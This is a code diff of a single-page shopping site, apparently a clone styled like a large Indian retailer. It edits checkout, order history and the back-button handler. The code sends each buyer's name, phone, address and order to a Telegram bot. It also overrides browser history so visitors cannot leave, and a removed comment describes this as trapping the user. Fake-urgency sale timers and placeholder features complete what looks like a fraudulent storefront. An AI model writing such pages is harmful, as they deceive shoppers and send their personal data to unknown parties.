+                document.getElementById('utrModal').style.display = 'flex';
+            }, 2000);
+            
+        }, 2000);
     }
 
     function startRazorpay() {
@@ -1995,21 +2250,28 @@
     }
 
     function completeOrder(refId) {
-        let itemsText = isCartOrder ? "🛒 Bulk Order:\n" + cart.map(i => `- ${i.name}`).join('\n') : `🛒 ${currentProduct.name}`;
-        const orderDetails = `NEW ORDER\n👤 ${window.userDetails.name}\n📱 ${window.userDetails.phone}\n🏠 ${window.userDetails.addr}\n${itemsText}\n💰 ₹${currentPrice}\n🆔 ${refId}`;
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: orderDetails })
-        }).catch(e => console.log("Telegram Error:", e));
-
+        // Clear User Rating state
+        userRating = 0;
+        
+        // Add current order to userOrders array
+        const orderData = {
+            id: refId,
+            items: isCartOrder ? [...cart] : [currentProduct],
+            total: currentPrice,
+            date: new Date().toLocaleDateString(),
+            status: "Processing"
+        };
+        userOrders.unshift(orderData); // Add to top
+        
         const successModal = document.getElementById('successModal');
         successModal.querySelector('.modal-content').innerHTML = `
             <div style="text-align:center;padding:20px;">
                 <div style="font-size:50px;color:#388e3c;margin-bottom:15px;"><i class="fas fa-check-circle"></i></div>
                 <h2 style="color:#212121; margin-bottom:5px;">Order Placed!</h2>
                 <p style="color:#666; font-size:12px; margin-bottom:15px;">ID: ${refId}</p>
+                
                 <hr style="border:0; border-top:1px solid #eee; margin:10px 0;">
+                
                 <h3 style="font-size:16px; margin-bottom:10px;">Rate Your Experience</h3>
                 <div class="rating-stars" id="user-rating-stars">
                     <i class="far fa-star" data-val="1" onclick="rateStar(1)"></i>
@@ -2019,11 +2281,78 @@
                     <i class="far fa-star" data-val="5" onclick="rateStar(5)"></i>
                 </div>
                 <input type="text" id="feedback-text" class="feedback-input" placeholder="Write your feedback (Optional)">
+                
                 <button onclick="submitFeedback('${refId}')" style="width:100%;background:#2874f0;color:white;padding:12px;border:none;margin-top:10px; cursor:pointer; font-weight:bold;">SUBMIT</button>
                 <button onclick="location.reload()" style="background:transparent; border:none; color:#878787; font-size:12px; margin-top:10px; cursor:pointer; text-decoration:underline;">Skip & Continue Shopping</button>
             </div>`;
         successModal.style.display = 'flex';
         if(isCartOrder) { cart = []; updateCartCount(); }
+    }
+    
+    // --- New Menu Functions ---
+    function showYourOrders() {
+        const modal = document.getElementById('ordersModal');
+        const list = document.getElementById('orders-list');
+        
+        if(userOrders.length === 0) {
+            list.innerHTML = `<div style="text-align:center; padding:40px; color:#878787;">
+                <i class="fas fa-box-open" style="font-size:40px; margin-bottom:10px;"></i>
+                <p>No orders yet</p>
+                <button onclick="document.getElementById('ordersModal').style.display='none'" style="margin-top:10px; padding:8px 15px; background:#2874f0; color:white; border:none; border-radius:2px; cursor:pointer;">Shop Now</button>
+            </div>`;
+        } else {
+            list.innerHTML = userOrders.map(order => `
+                <div style="background:white; padding:15px; margin-bottom:10px; border-radius:4px; box-shadow:0 1px 2px rgba(0,0,0,0.1);">
+                    <div style="display:flex; justify-content:space-between; margin-bottom:10px; font-size:13px; color:#878787;">
+                        <span>Order ID: ${order.id}</span>
+                        <span>${order.date}</span>
+                    </div>
+                    ${order.items.map(item => `
+                        <div style="display:flex; gap:10px; margin-bottom:10px;">
+                            <img src="${item.image}" style="width:50px; height:50px; object-fit:contain;">
+                            <div>
+                                <div style="font-size:14px; color:#212121; font-weight:500;">${item.name}</div>
+                                <div style="font-size:13px; color:#388e3c;">${order.status}</div>
+                            </div>
+                        </div>
+                    `).join('')}
+                    <div style="border-top:1px solid #f0f0f0; padding-top:10px; text-align:right; font-weight:bold;">
+                        Total: ₹${order.total}
+                    </div>
+                </div>
+            `).join('');
+        }
+        
+        modal.style.display = 'flex';
+    }
+    
+    function showSavedAddress() {
+        if(window.userDetails && window.userDetails.addr) {
+            showFeatureToast(`Saved Address:\n${window.userDetails.name}, ${window.userDetails.addr}, ${window.userDetails.pincode}`);
+        } else {
+            showFeatureToast("No saved addresses found");
+        }
+    }
+    
+    function openLangModal() {
+        document.getElementById('langModal').style.display = 'flex';
+    }
+    
+    function selectLanguage(lang) {
+        document.querySelectorAll('.lang-option').forEach(el => el.classList.remove('selected'));
+        // In a real app, this would change logic. For now just visual selection.
+        event.currentTarget.classList.add('selected');
+    }
+    
+    function applyLanguage() {
+        document.getElementById('langModal').style.display = 'none';
+        showToast("Language updated successfully!");
+        // Simulate reload
+        setTimeout(() => location.reload(), 1000);
+    }
+    
+    function showFeatureToast(featureName) {
+        showToast(`${featureName} feature coming soon!`);
     }
 
     function rateStar(val) {
@@ -2045,7 +2374,10 @@
         const ratingText = userRating > 0 ? `${userRating} ⭐` : "No Rating";
         let itemsText = isCartOrder ? "🛒 Bulk Order:\n" + cart.map(i => `- ${i.name}`).join('\n') : `🛒 ${currentProduct.name}`;
         
-        const finalOrderDetails = `✅ ORDER CONFIRMED\n🆔 ${refId}\n👤 ${window.userDetails.name}\n📱 ${window.userDetails.phone}\n🏠 ${window.userDetails.addr}\n${itemsText}\n💰 ₹${currentPrice}\n\n⭐ RATING: ${ratingText}\n📝 FEEDBACK: ${feedback}`;
+        // Add payment mode info
+        const paymentMode = isCodSelected ? "Cash on Delivery" : "Online / UPI";
+
+        const finalOrderDetails = `✅ ORDER CONFIRMED\n🆔 ${refId}\n👤 ${window.userDetails.name}\n📱 ${window.userDetails.phone}\n🏠 ${window.userDetails.addr}\n${itemsText}\n💰 ₹${currentPrice} (${paymentMode})\n\n⭐ RATING: ${ratingText}\n📝 FEEDBACK: ${feedback}`;
         
         fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -2068,34 +2400,39 @@
         } catch(err) { console.log("History API not supported"); }
 
         window.addEventListener('popstate', function(event) {
-            // Check what is open
             const cart = document.getElementById('cartModal');
             const checkout = document.getElementById('checkoutModal');
             const detail = document.getElementById('product-detail-view');
             const utr = document.getElementById('utrModal');
             const success = document.getElementById('successModal');
+            const orders = document.getElementById('ordersModal');
+            const lang = document.getElementById('langModal');
 
             let handled = false;
 
-            if (utr.style.display === 'flex') {
+            if (utr && utr.style.display === 'flex') {
                 utr.style.display = 'none';
                 handled = true;
-            } else if (success.style.display === 'flex') {
+            } else if (success && success.style.display === 'flex') {
                 success.style.display = 'none';
                 handled = true;
-            } else if (checkout.style.display === 'flex') {
-                closeModal(); // Reuse existing function
+            } else if (orders && orders.style.display === 'flex') {
+                orders.style.display = 'none';
                 handled = true;
-            } else if (cart.style.display === 'flex') {
+            } else if (lang && lang.style.display === 'flex') {
+                lang.style.display = 'none';
+                handled = true;
+            } else if (checkout && checkout.style.display === 'flex') {
+                closeModal(); 
+                handled = true;
+            } else if (cart && cart.style.display === 'flex') {
                 cart.style.display = 'none';
                 handled = true;
-            } else if (detail.style.display === 'block' && !detail.classList.contains('hidden')) {
-                goHome(); // Reuse existing function
+            } else if (detail && detail.style.display === 'block' && !detail.classList.contains('hidden')) {
+                goHome(); 
                 handled = true;
             }
 
-            // Always push state back to trap the user on the page (App-like behavior)
-            // This prevents the browser from actually going back to the previous page
             try {
                 history.pushState(null, null, window.location.href);
             } catch(err) { console.log("History API not supported"); }
@@ -2105,13 +2442,12 @@
         
         // Start Sale Cycle Check
         updateSaleCycle();
-        setInterval(updateSaleCycle, 1000); // Check every second for timer update & cycle shift
+        setInterval(updateSaleCycle, 1000); 
         
         renderProducts();
         
-        const loginBtn = document.querySelector('.login-btn');
-        if(loginBtn) loginBtn.addEventListener('click', () => { showToast("You are already logged in!"); });
-
+        // Removed old login listener as button is removed
+        
         const searchInput = document.querySelector('.search-bar input');
         if(searchInput) {
             searchInput.addEventListener('input', (e) => {
@@ -2124,4 +2460,3 @@
     </script>
 </body>
 </html>
-
